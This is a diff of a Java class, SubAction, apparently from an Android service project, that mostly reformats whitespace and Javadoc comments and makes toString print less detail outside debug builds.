@@ -22,7 +22,7 @@ import com.android.service.util.Check;
 /**
  * The Class SubAction.
  */
-public abstract class SubAction  {
+public abstract class SubAction {
 
 	private static final String TAG = "SubAction"; //$NON-NLS-1$
 
@@ -37,8 +37,6 @@ public abstract class SubAction  {
 
 	/** The status. */
 	Status status;
-
-	
 
 	/**
 	 * Instantiates a new sub action.
@@ -57,7 +55,8 @@ public abstract class SubAction  {
 
 	/**
 	 * Factory.
-	 * @param type 
+	 * 
+	 * @param type
 	 * 
 	 * @param typeId
 	 *            the type
@@ -65,11 +64,12 @@ public abstract class SubAction  {
 	 *            the conf params
 	 * @return the sub action
 	 * @throws JSONException
-	 * @throws ConfigurationException 
+	 * @throws ConfigurationException
 	 */
-	public static SubAction factory(String type, final ConfAction params) throws  ConfigurationException {
-		if (Cfg.DEBUG) Check.asserts(type != null,"factory: null type");
-		
+	public static SubAction factory(String type, final ConfAction params) throws ConfigurationException {
+		if (Cfg.DEBUG)
+			Check.asserts(type != null, "factory: null type");
+
 		if (type.equals("uninstall")) {
 
 			if (Cfg.DEBUG) {
@@ -152,10 +152,10 @@ public abstract class SubAction  {
 		return null;
 	}
 
-	public String getType(){
+	public String getType() {
 		return conf.getType();
 	}
-	
+
 	/** The finished. */
 	private boolean finished;
 
@@ -169,7 +169,8 @@ public abstract class SubAction  {
 
 	/**
 	 * Execute.
-	 * @param trigger 
+	 * 
+	 * @param trigger
 	 * 
 	 * @return true, if successful
 	 */
@@ -184,7 +185,6 @@ public abstract class SubAction  {
 		return finished;
 	}
 
-
 	/**
 	 * Prepare execute.
 	 */
@@ -193,10 +193,14 @@ public abstract class SubAction  {
 			finished = false;
 		}
 	}
-	
+
 	@Override
 	public String toString() {
-		return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" +conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+		if(Cfg.DEBUG){
+			return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" + conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+		}else{
+			return conf.actionId + "/" + conf.subActionId;
+		}
 	}
 
 }
